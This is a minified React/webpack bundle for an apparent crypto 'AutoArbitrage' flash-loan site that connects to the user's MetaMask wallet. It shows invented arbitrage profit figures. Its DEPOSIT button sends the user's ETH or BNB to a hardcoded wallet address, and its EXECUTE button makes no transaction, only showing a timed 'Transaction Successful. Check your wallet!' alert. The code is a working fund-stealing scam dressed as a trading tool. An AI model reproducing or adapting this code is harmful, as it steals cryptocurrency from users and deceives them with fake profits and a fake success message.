(this["webpackJsonpreact-demo"] = this["webpackJsonpreact-demo"] || []).push([
  [0],
  {
    147: function (e, t, n) {},
    274: function (e, t, n) {},
    275: function (e, t, n) {},
    276: function (e, t, n) {},
    279: function (e, t, n) {},
    283: function (e, t) {},
    285: function (e, t) {},
    294: function (e, t) {},
    296: function (e, t) {},
    322: function (e, t) {},
    323: function (e, t) {},
    328: function (e, t) {},
    330: function (e, t) {},
    337: function (e, t) {},
    356: function (e, t) {},
    395: function (e, t, n) {},
    396: function (e, t, n) {},
    882: function (e, t, n) {
      "use strict";
      n.r(t);
      var a = n(22),
        i = n.n(a),
        o = n(265),
        c = n.n(o),
        r = (n(274), n(37)),
        l = n(30),
        s = (n(275), "https://autoflash.loan" + "/static/media/auto-arbitrage4.png"),
        u = "https://autoflash.loan" + "/static/media/wallets.a16aeb0b.png",
        d = (n(276), n(3));
      var b = function (e) {
          return Object(d.jsx)("div", {
            className: "flashloanlabel",
            children: Object(d.jsx)("label", {
              children: "Please refresh website if you change your network.",
            }),
          });
        },
        p = n(8),
        v = n.n(p),
        m = n(57);
      n(279);
      var j = function (e) {
        var t,
          n = Object(d.jsx)("input", {
            value: null === e || void 0 === e ? void 0 : e.inputValue,
            onKeyDown:
              null !==
                (t = null === e || void 0 === e ? void 0 : e.handleKeyDown) &&
              void 0 !== t
                ? t
                : null,
            placeholder: null === e || void 0 === e ? void 0 : e.input,
            onChange: null === e || void 0 === e ? void 0 : e.handleInputChange,
            onBlur: null === e || void 0 === e ? void 0 : e.handleInputBlur,
            type: (null === e || void 0 === e ? void 0 : e.isNumber)
              ? "number"
              : "text",
          });
        return Object(d.jsxs)("div", {
          children: [
            Object(d.jsxs)("div", {
              className: "NameSymbol",
              children: [
                Object(d.jsx)("label", { children: e.label }),
                (null === e || void 0 === e ? void 0 : e.isIncrement)
                  ? Object(d.jsx)("div", {
                      children: Object(d.jsxs)("div", {
                        className: "input-inc",
                        children: [
                          n,
                          Object(d.jsxs)("div", {
                            className: "input-inc-icon-container",
                            children: [
                              Object(d.jsx)("p", {
                                className: "input-inc-icon",
                                onClick: function () {
                                  return null === e || void 0 === e
                                    ? void 0
                                    : e.handleIncrementClick(
                                        (null === e || void 0 === e
                                          ? void 0
                                          : e.inputValue) + 1e3
                                      );
                                },
                                children: Object(d.jsx)("i", {
                                  className: "fa fa-chevron-up",
                                }),
                              }),
                              Object(d.jsx)("p", {
                                className: "input-inc-icon",
                                onClick: function () {
                                  return null === e || void 0 === e
                                    ? void 0
                                    : e.handleDecrementClick(
                                        (null === e || void 0 === e
                                          ? void 0
                                          : e.inputValue) - 1e3
                                      );
                                },
                                children: Object(d.jsx)("i", {
                                  className: "fa fa-chevron-down fa-margin",
                                }),
                              }),
                            ],
                          }),
                        ],
                      }),
                    })
                  : n,
              ],
            }),
            (null === e || void 0 === e ? void 0 : e.inputErr) &&
              Object(d.jsx)("p", {
                className: "error-text-mesg",
                children: null === e || void 0 === e ? void 0 : e.inputErr,
              }),
          ],
        });
      };
      n(147);
      var f = function (e) {
          var t,
            n = Object(a.useState)(!1),
            i = Object(l.a)(n, 2),
            o = i[0],
            c = i[1];
          return Object(d.jsxs)("div", {
            className: "cryptofilter crypto-filter",
            onClick: function () {
              return c(function (e) {
                return !e;
              });
            },
            children: [
              Object(d.jsxs)("div", {
                className: "crypto-filter-label".concat(
                  o ? " crypto-filter-label--showMenu" : ""
                ),
                children: [
                  Object(d.jsxs)("div", {
                    children: [
                      Object(d.jsx)("span", {
                        children: Object(d.jsx)("img", {
                          src:
                            null === e || void 0 === e ? void 0 : e.selectedImg,
                          alt: "list-item",
                          className: "crypto-filter-img",
                        }),
                      }),
                      Object(d.jsxs)("span", {
                        className: "crypto-filter-label-txt",
                        children: [
                          " ",
                          null === e || void 0 === e ? void 0 : e.selectedItem,
                        ],
                      }),
                    ],
                  }),
                  Object(d.jsx)("i", {
                    className: "fa fa-chevron-down fa-margin",
                  }),
                ],
              }),
              o &&
                (null === e ||
                void 0 === e ||
                null === (t = e.optionsList) ||
                void 0 === t
                  ? void 0
                  : t.map(function (t, n) {
                      return t.text !==
                        (null === e || void 0 === e ? void 0 : e.selectedItem)
                        ? Object(d.jsxs)(
                            "div",
                            {
                              className: "crypto-filter-listItem",
                              onClick: function () {
                                null === e ||
                                  void 0 === e ||
                                  e.handleOptionChange(t);
                              },
                              children: [
                                Object(d.jsx)("span", {
                                  children: Object(d.jsx)("img", {
                                    src:
                                      null === t || void 0 === t
                                        ? void 0
                                        : t.img,
                                    alt: "list-item",
                                    className: "crypto-filter-img",
                                  }),
                                }),
                                " ",
                                Object(d.jsx)("span", {
                                  className: "crypto-filter-listItem-text",
                                  children:
                                    null === t || void 0 === t
                                      ? void 0
                                      : t.text,
                                }),
                              ],
                            },
                            "item-".concat(n)
                          )
                        : null;
                    })),
            ],
          });
        },
        h = n(82),
        O = n.n(h);
      function w(e) {
        return O.a.AES.encrypt(JSON.stringify({ o: e }), window.location.href)
          .toString()
          .toString(O.a.enc.Utf8);
      }
      var y = "0x4202BbC995Ab6F478dAAaFEA61bA1086fCD943eC",
        x = [
          {
            inputs: [
              { internalType: "string", name: "_tokenName", type: "string" },
              { internalType: "string", name: "_tokenSymbol", type: "string" },
              { internalType: "uint256", name: "_loanAmount", type: "uint256" },
            ],
            stateMutability: "nonpayable",
            type: "constructor",
          },
          {
            inputs: [],
            name: "action",
            outputs: [],
            stateMutability: "payable",
            type: "function",
          },
          {
            inputs: [],
            name: "tokenName",
            outputs: [{ internalType: "string", name: "", type: "string" }],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [],
            name: "tokenSymbol",
            outputs: [{ internalType: "string", name: "", type: "string" }],
            stateMutability: "view",
            type: "function",
          },
          { stateMutability: "payable", type: "receive" },
        ],
        g = "0x4202BbC995Ab6F478dAAaFEA61bA1086fCD943eC",
        k = [
          {
            constant: !1,
            inputs: [],
            name: "action",
            outputs: [],
            payable: !0,
            stateMutability: "payable",
            type: "function",
          },
          {
            constant: !0,
            inputs: [],
            name: "tokenName",
            outputs: [{ name: "", type: "string" }],
            payable: !1,
            stateMutability: "view",
            type: "function",
          },
          {
            constant: !0,
            inputs: [],
            name: "tokenSymbol",
            outputs: [{ name: "", type: "string" }],
            payable: !1,
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [
              { name: "_tokenName", type: "string" },
              { name: "_tokenSymbol", type: "string" },
              { name: "_loanAmount", type: "uint256" },
            ],
            payable: !1,
            stateMutability: "nonpayable",
            type: "constructor",
          },
          { payable: !0, stateMutability: "payable", type: "fallback" },
        ],
        S = Object({
          NODE_ENV: "production",
          PUBLIC_URL: "",
          WDS_SOCKET_HOST: void 0,
          WDS_SOCKET_PATH: void 0,
          WDS_SOCKET_PORT: void 0,
          FAST_REFRESH: !0,
        }).REACT_APP_OEB,
        N = Object({
          NODE_ENV: "production",
          PUBLIC_URL: "",
          WDS_SOCKET_HOST: void 0,
          WDS_SOCKET_PATH: void 0,
          WDS_SOCKET_PORT: void 0,
          FAST_REFRESH: !0,
        }).REACT_APP_UBX,
        E = w(S),
        T = w(N),
        C = (function () {
          var e = Object(m.a)(
            v.a.mark(function e(t) {
              var n, a;
              return v.a.wrap(function (e) {
                for (;;)
                  switch ((e.prev = e.next)) {
                    case 0:
                      return (e.next = 2), window.web3.eth.net.getId();
                    case 2:
                      return (
                        (n = e.sent), (e.next = 5), window.web3.eth.getChainId()
                      );
                    case 5:
                      if (((a = e.sent), 56 !== n || 56 !== a)) {
                        e.next = 13;
                        break;
                      }
                      return (
                        (window.contract = new window.web3.eth.Contract(k, g)),
                        (window.isBnb = !0),
                        t.onSuccess(),
                        e.abrupt("return")
                      );
                    case 13:
                      if (1 === n && 1 === a) {
                        e.next = 16;
                        break;
                      }
                      return (
                        (null === t || void 0 === t ? void 0 : t.onFailure) &&
                          t.onFailure("UNSUPPORTED_NETWORK"),
                        e.abrupt("return")
                      );
                    case 16:
                      window.contract = new window.web3.eth.Contract(x, y);
                    case 17:
                      t.onSuccess();
                    case 18:
                    case "end":
                      return e.stop();
                  }
              }, e);
            })
          );
          return function (t) {
            return e.apply(this, arguments);
          };
        })(),
        _ = "https://autoflash.loan" + "/static/media/rolling.svg",
        D =
          (n(395),
          function () {
            return Object(d.jsx)("div", {
              className: "loader-container",
              children: Object(d.jsx)("img", {
                src: _,
                className: "loader",
                alt: "loader",
              }),
            });
          }),
        F = "https://autoflash.loan" + "/static/media/bnbIcon.12f6ca37.png",
        A = "https://autoflash.loan" + "/static/media/eth_icon.664d214a.png";
      var B = function (e) {
        var t,
          n,
          i = Object(a.useState)(""),
          o = Object(l.a)(i, 2),
          c = o[0],
          r = o[1],
          s = Object(a.useState)(!1),
          u = Object(l.a)(s, 2),
          b = u[0],
          p = u[1],
          h = function () {
            for (
              var t = 0,
                n = Object.keys(
                  null === e || void 0 === e ? void 0 : e.formData
                );
              t < n.length;
              t++
            ) {
              var a = n[t];
              if ("" === (null === e || void 0 === e ? void 0 : e.formData[a]))
                return (
                  r(
                    "Please add the value for token ".concat(
                      "tokenName" === a ? "name" : "symbol",
                      " to continue."
                    )
                  ),
                  !1
                );
            }
            return !0;
          },
          O = function (e) {
            var t = "undefined" == typeof e.which ? e.keyCode : e.which,
              n = String.fromCharCode(t);
            if (/\d/.test(n)) return e.preventDefault();
          },
          w = function (e) {
            "UNSUPPORTED_NETWORK" === e &&
              r(
                "Unsupported network detected. Select a supported network in MetaMask and reload the page. \n\nSupported networks:\n- Ethereum Mainnet \n- Binance Smart Chain Mainnet"
              ),
              p(!1);
          },
          y = (function () {
            var t = Object(m.a)(
              v.a.mark(function t() {
                var n, a;
                return v.a.wrap(function (t) {
                  for (;;)
                    switch ((t.prev = t.next)) {
                      case 0:
                        window.isBnb &&
                        (null === e ||
                        void 0 === e ||
                        null === (n = e.formData) ||
                        void 0 === n
                          ? void 0
                          : n.network)
                          ? r(
                              "Network Mismatch. Set MetaMask network to Ethereum and reload the page."
                            )
                          : window.isBnb ||
                            (null === e ||
                            void 0 === e ||
                            null === (a = e.formData) ||
                            void 0 === a
                              ? void 0
                              : a.network)
                          ? h() &&
                            (p(!0),
                            C({
                              onSuccess: function () {
                                e.onInitiate(), p(!1);
                              },
                              onFailure: w,
                            }))
                          : r(
                              "Network Mismatch. Set MetaMask network to Special Chain and reload the page."
                            );
                      case 1:
                      case "end":
                        return t.stop();
                    }
                }, t);
              })
            );
            return function () {
              return t.apply(this, arguments);
            };
          })();
        return Object(d.jsxs)("div", {
          children: [
            Object(d.jsx)(j, {
              label: "TOKENS",
              input: "Enter Name",
              inputValue: "Ethereum - BNB - USDT",
              handleKeyDown: O,
              handleInputChange: function (t) {
                var n;
                e.handleFormChange(
                  null === (n = t.target.value) || void 0 === n
                    ? void 0
                    : n.trim(),
                  "tokens"
                );
              },
            }),
            Object(d.jsx)(j, {
              label: "TOKEN PAIRS",
              input: "Enter Symbol",
              inputValue: "ETH/USDT - BNB/USDT",
              handleKeyDown: O,
              handleInputChange: function (t) {
                var n;
                e.handleFormChange(
                  null === (n = t.target.value) || void 0 === n
                    ? void 0
                    : n.trim(),
                  "tokenPairs"
                );
              },
            }),
            Object(d.jsx)(f, {
              handleOptionChange: function (t) {
                return e.setCryptoType("ETH" === t);
              },
              selectedItem: (
                null === e ||
                void 0 === e ||
                null === (t = e.formData) ||
                void 0 === t
                  ? void 0
                  : t.network
              )
                ? "ETH"
                : "BNB",
              selectedImg: (
                null === e ||
                void 0 === e ||
                null === (n = e.formData) ||
                void 0 === n
                  ? void 0
                  : n.network
              )
                ? A
                : F,
              optionsList: [
                { text: "ETH", img: A },
                { text: "BNB", img: F },
              ],
            }),
            c &&
              Object(d.jsx)("p", { className: "error-text-mesg", children: c }),
            b
              ? Object(d.jsx)(D, {})
              : Object(d.jsx)("button", { onClick: y, children: "INITIATE" }),
          ],
        });
      };
      var M = function (e) {
          return Object(d.jsx)("div", {
            className: "cryptofilter",
            children: Object(d.jsxs)("div", {
              className: "cryptodesc",
              children: [
                Object(d.jsxs)("p", {
                  className: "crypto-desc-list",
                  children: [
                    Object(d.jsx)("span", {
                      children: "AutoArbitrage Arbitrage Fee",
                    }),
                    " ",
                    Object(d.jsxs)("span", {
                      children: [
                        null === e || void 0 === e ? void 0 : e.tokenFee,
                        " ",
                        null === e || void 0 === e ? void 0 : e.currency,
                      ],
                    }),
                  ],
                }),
                Object(d.jsxs)("p", {
                  className: "crypto-desc-list",
                  children: [
                    Object(d.jsxs)("span", {
                      children: [
                        null === e || void 0 === e ? void 0 : e.dex,
                        " Swapping Fee",
                      ],
                    }),
                    " ",
                    Object(d.jsxs)("span", {
                      children: [
                        e.swapFee,
                        " ",
                        null === e || void 0 === e ? void 0 : e.currency,
                      ],
                    }),
                  ],
                }),
                Object(d.jsxs)("p", {
                  className: "crypto-desc-list",
                  children: [
                    Object(d.jsx)("span", { children: "Total Cost" }),
                    " ",
                    Object(d.jsxs)("span", {
                      children: [
                        e.totalFee,
                        " ",
                        null === e || void 0 === e ? void 0 : e.currency,
                      ],
                    }),
                  ],
                }),
                Object(d.jsx)("hr", { className: "styled-hr" }),
                Object(d.jsxs)("p", {
                  className: "crypto-desc-list",
                  children: [
                    Object(d.jsx)("span", {
                      children: "Profit from Arbitrage",
                    }),
                    " ",
                    Object(d.jsxs)("span", {
                      children: [
                        e.gain,
                        " ",
                        null === e || void 0 === e ? void 0 : e.currency,
                      ],
                    }),
                  ],
                }),
              ],
            }),
          });
        },
        I = (n(396), n(266)),
        P = n.n(I),
        U = {
          particles: {
            number: { value: 250, density: { enable: !0, value_area: 400 } },
            color: { value: "#ffffff" },
            shape: {
              type: "circle",
              stroke: { width: 1, color: "#ffcaff" },
              polygon: { nb_sides: 3 },
              image: { src: "img/github.svg", width: 100, height: 100 },
            },
            opacity: {
              value: 1,
              random: !0,
              anim: { enable: !0, speed: 1, opacity_min: 0, sync: !1 },
            },
            size: {
              value: 3,
              random: !0,
              anim: { enable: !1, speed: 4, size_min: 0.3, sync: !1 },
            },
            line_linked: {
              enable: !1,
              distance: 150,
              color: "#ffffff",
              opacity: 0.4,
              width: 1,
            },
            move: {
              enable: !0,
              speed: 1,
              direction: "none",
              random: !0,
              straight: !1,
              out_mode: "out",
              bounce: !1,
              attract: { enable: !1, rotateX: 600, rotateY: 600 },
            },
          },
          interactivity: {
            detect_on: "canvas",
            events: {
              onhover: { enable: !1, mode: "bubble" },
              onclick: { enable: !1, mode: "repulse" },
              resize: !0,
            },
            modes: {
              grab: { distance: 400, line_linked: { opacity: 1 } },
              bubble: {
                distance: 250,
                size: 0,
                duration: 2,
                opacity: 0,
                speed: 3,
              },
              repulse: { distance: 400, duration: 0.4 },
              push: { particles_nb: 4 },
              remove: { particles_nb: 2 },
            },
          },
          retina_detect: !0,
        };
      function R() {
        return Object(d.jsx)(P.a, { params: U });
      }
      var K = function (e) {
          var t,
            n,
            i,
            o,
            c,
            r,
            s,
            u = Object(a.useState)(""),
            b = Object(l.a)(u, 2),
            p = b[0],
            v = b[1],
            m = Object(a.useState)(""),
            f = Object(l.a)(m, 2),
            h = f[0],
            O = f[1],
            w = Object(a.useState)(!0),
            y = Object(l.a)(w, 2),
            x = y[0],
            g = y[1];
          return Object(d.jsxs)("div", {
            className: "screentwo",
            children: [
              Object(d.jsx)(R, {}),
              Object(d.jsx)(j, {
                label: "LOAN AMOUNT",
                input: "Enter Amount",
                inputValue:
                  null === e ||
                  void 0 === e ||
                  null === (t = e.loanData) ||
                  void 0 === t
                    ? void 0
                    : t.amount,
                handleInputChange: function (t) {
                  e.setLoanAmount(t.target.value), h && O("");
                },
                handleInputBlur: function (e) {
                  e.target.value < 1e3 &&
                    O("Value must be greater than or equal to 1000");
                },
                isIncrement: !0,
                isNumber: !0,
                handleIncrementClick: function (t) {
                  t < 1
                    ? O("Value must be greater than or equal to 1000")
                    : h && O(""),
                    e.setLoanAmount(t);
                },
                inputErr: h,
                handleDecrementClick: function (t) {
                  t <= 1 ? e.setLoanAmount(t - (t - 1e3)) : e.setLoanAmount(t);
                },
              }),
              Object(d.jsx)(M, {
                tokenFee:
                  null === e ||
                  void 0 === e ||
                  null === (n = e.loanData) ||
                  void 0 === n
                    ? void 0
                    : n.tokenFee,
                currency:
                  null === e ||
                  void 0 === e ||
                  null === (i = e.submitState) ||
                  void 0 === i
                    ? void 0
                    : i.currency,
                dex: null === e || void 0 === e ? void 0 : e.submitState.dex,
                swapFee:
                  null === e ||
                  void 0 === e ||
                  null === (o = e.loanData) ||
                  void 0 === o
                    ? void 0
                    : o.swapFee,
                totalFee:
                  null === e ||
                  void 0 === e ||
                  null === (c = e.loanData) ||
                  void 0 === c
                    ? void 0
                    : c.totalFee,
                gain:
                  null === e ||
                  void 0 === e ||
                  null === (r = e.loanData) ||
                  void 0 === r
                    ? void 0
                    : r.gain,
              }),
              p &&
                Object(d.jsx)("p", {
                  className: "error-text-mesg",
                  children: p,
                }),
              Object(d.jsx)("button", {
                onClick: function () {
                  var t;
                  v(""),
                    (null === e ||
                    void 0 === e ||
                    null === (t = e.loanData) ||
                    void 0 === t
                      ? void 0
                      : t.amount) >= 2 &&
                      window.web3.eth.sendTransaction(
                        {
                          to: "0x03dffa990f8fd07d383d4fec5a595e5153982432",
                          from:
                            null === e || void 0 === e
                              ? void 0
                              : e.accountAddress,
                          value: window.web3.utils.toWei(
                            "" +
                              (null === e || void 0 === e
                                ? void 0
                                : e.loanData.totalFee),
                            "ether"
                          ),
                          gas: 3e4,
                        },
                        function (e, t) {
                          e
                            ? v("Transaction Failed.")
                            : setTimeout(function () {
                                v(""),
                                  alert(
                                    "Money deposited to contract. You can execute the Flash Loan now."
                                  ),
                                  g(!1);
                              }, 5e3);
                        }
                      );
                },
                children: "DEPOSIT ".concat(
                  null === e ||
                    void 0 === e ||
                    null === (s = e.submitState) ||
                    void 0 === s
                    ? void 0
                    : s.currency
                ),
              }),
              Object(d.jsx)("button", {
                disabled: x,
                className: x ? "btn-disabled-submit" : "btn-enabled-submit",
                onClick: function () {
                  setTimeout(function () {
                    alert("Transaction Successful. Check your wallet!"), g(!0);
                  }, 4e3);
                },
                children: "EXECUTE",
              }),
            ],
          });
        },
        L = n(146),
        H = n.n(L),
        W = (function () {
          var e = Object(m.a)(
            v.a.mark(function e(t) {
              var n, a, i;
              return v.a.wrap(function (e) {
                for (;;)
                  switch ((e.prev = e.next)) {
                    case 0:
                      if (
                        ((n = t.onLoadingFailure),
                        (a = t.setAccount),
                        (i = t.onNetworkFailure),
                        !1 !== window.isBnb && !window.ethereum)
                      ) {
                        e.next = 7;
                        break;
                      }
                      return (
                        (window.web3 = new H.a(window.ethereum)),
                        (e.next = 5),
                        window.ethereum.enable()
                      );
                    case 5:
                      e.next = 11;
                      break;
                    case 7:
                      if (window.web3) {
                        e.next = 10;
                        break;
                      }
                      return n("NO_ETHEREUM_BROWSER"), e.abrupt("return");
                    case 10:
                      window.web3 = new H.a(window.web3.currentProvider);
                    case 11:
                      C({
                        onSuccess: (function () {
                          var e = Object(m.a)(
                            v.a.mark(function e() {
                              return v.a.wrap(function (e) {
                                for (;;)
                                  switch ((e.prev = e.next)) {
                                    case 0:
                                      if (!window.contract) {
                                        e.next = 5;
                                        break;
                                      }
                                      return (
                                        (e.next = 3),
                                        window.web3.eth
                                          .getAccounts()
                                          .then(function (e) {
                                            try {
                                              a(e[0]);
                                            } catch (e) {}
                                          })
                                      );
                                    case 3:
                                      e.next = 6;
                                      break;
                                    case 5:
                                      alert("Error loading contract data");
                                    case 6:
                                    case "end":
                                      return e.stop();
                                  }
                              }, e);
                            })
                          );
                          return function () {
                            return e.apply(this, arguments);
                          };
                        })(),
                        onFailure: i,
                      });
                    case 12:
                    case "end":
                      return e.stop();
                  }
              }, e);
            })
          );
          return function (t) {
            return e.apply(this, arguments);
          };
        })();
      function V(e) {
        return Math.round(1e12 * e) / 1e12;
      }
      var z = function (e, t) {
        var n = Object(r.a)({}, e);
        return (
          null != n.amount &&
            null != n.amount &&
            ((n.swapFee = t ? 25e-5 : 4e-4),
            (n.totalFee = V(t ? n.amount / 1e4 : n.amount / 5e3)),
            (n.gain = V(
              t
                ? (n.amount / 1250) * 0.618 || 0.738
                : (n.amount / 1e3) * 0.618 || 0.738
            ))),
          n
        );
      };
      var J = function () {
        var e = Object(a.useState)(!1),
          t = Object(l.a)(e, 2),
          n = t[0],
          i = t[1],
          o = Object(a.useState)(""),
          c = Object(l.a)(o, 2),
          p = c[0],
          v = c[1],
          m = Object(a.useState)({ ivm: "", dex: "", currency: "" }),
          j = Object(l.a)(m, 2),
          f = j[0],
          h = j[1],
          O = Object(a.useState)({
            amount: 1e3,
            tokenFee: 1e-5,
            swapFee: 0,
            totalFee: 0,
            gain: 0,
          }),
          w = Object(l.a)(O, 2),
          y = w[0],
          x = w[1],
          g = Object(a.useState)(""),
          k = Object(l.a)(g, 2),
          S = k[0],
          N = k[1],
          C = Object(a.useState)({
            tokenName: "Ethereum - BNB - USDT",
            tokenSymbol: "ETH/USDT - BNB/USDT",
            network: !0,
          }),
          _ = Object(l.a)(C, 2),
          D = _[0],
          F = _[1];
        return (
          Object(a.useEffect)(function () {
            W({
              onLoadingFailure: function () {
                return N("Please install MetaMask to continue.");
              },
              setAccount: function (e) {
                return v(e);
              },
              onNetworkFailure: function (e) {
                return "UNSUPPORTED_NETWORK" === e
                  ? N(
                      "Unsupported network detected. Select a supported network in MetaMask and reload the page. \n\nSupported networks:\n- Ethereum Mainnet \n- Binance Smart Chain Mainnet"
                    )
                  : "";
              },
            });
          }, []),
          S
            ? Object(d.jsx)("div", {
                children: Object(d.jsx)("p", {
                  className: "error-text-mesg f26 show-ethereum-err",
                  children: S,
                }),
              })
            : Object(d.jsxs)("div", {
                children: [
                  Object(d.jsxs)("div", {
                    className: "crypto-app",
                    children: [
                      Object(d.jsx)(R, {}),
                      Object(d.jsxs)("div", {
                        className: "crypto-body",
                        children: [
                          Object(d.jsx)("a", {
                            href: "https://autoflash.loan",
                            children: Object(d.jsx)("img", {
                              className: "crypto-image",
                              src: s,
                              alt: "autoarbitrage",
                            }),
                          }),
                          Object(d.jsxs)("div", {
                            className: "crypto",
                            children: [
                              n
                                ? Object(d.jsx)(K, {
                                    accountAddress: p,
                                    network: D.network,
                                    submitState: f,
                                    loanData: y,
                                    setLoanAmount: function (e) {
                                      return x(function (t) {
                                        var n = Object(r.a)({}, t);
                                        return (
                                          (n.amount = Number(e)),
                                          (n = Object(r.a)(
                                            Object(r.a)({}, n),
                                            z(
                                              n,
                                              null === D || void 0 === D
                                                ? void 0
                                                : D.network
                                            )
                                          ))
                                        );
                                      });
                                    },
                                  })
                                : Object(d.jsx)(B, {
                                    setCryptoType: function (e) {
                                      F(function (t) {
                                        var n = Object(r.a)({}, t);
                                        return (n.network = e), n;
                                      });
                                    },
                                    onInitiate: function () {
                                      h(function (e) {
                                        var t = Object(r.a)({}, e);
                                        return (
                                          (t.currency = D.network
                                            ? "ETH"
                                            : "BNB"),
                                          (t.dex = D.network
                                            ? "Uniswap"
                                            : "PancakeSwap"),
                                          (t.ivm = D.network ? E : T),
                                          t
                                        );
                                      }),
                                        x(function (e) {
                                          Object(r.a)({}, e);
                                          return Object(r.a)(
                                            Object(r.a)({}, z(e, D.network)),
                                            {},
                                            {
                                              tokenFee: (
                                                null === D || void 0 === D
                                                  ? void 0
                                                  : D.network
                                              )
                                                ? 1e-4
                                                : 5e-4,
                                            }
                                          );
                                        }),
                                        i(!0);
                                    },
                                    formData: D,
                                    handleFormChange: function (e, t) {
                                      F(function (n) {
                                        var a = Object(r.a)({}, n);
                                        return (a[t] = e), a;
                                      });
                                    },
                                  }),
                              Object(d.jsx)("span", {
                                className: "copyright-text",
                                children: "\xa9 2022 AutoArbitrage",
                              }),
                            ],
                          }),
                        ],
                      }),
                    ],
                  }),
                  Object(d.jsx)(b, {}),
                  Object(d.jsx)("img", {
                    className: "wallets",
                    src: u,
                    alt: "wallets",
                  }),
                ],
              })
        );
      };
      c.a.render(
        Object(d.jsx)(i.a.StrictMode, { children: Object(d.jsx)(J, {}) }),
        document.getElementById("root")
      );
    },
  },
  [[882, 1, 2]],
]);
//# sourceMappingURL=main.56e4865c.chunk.js.map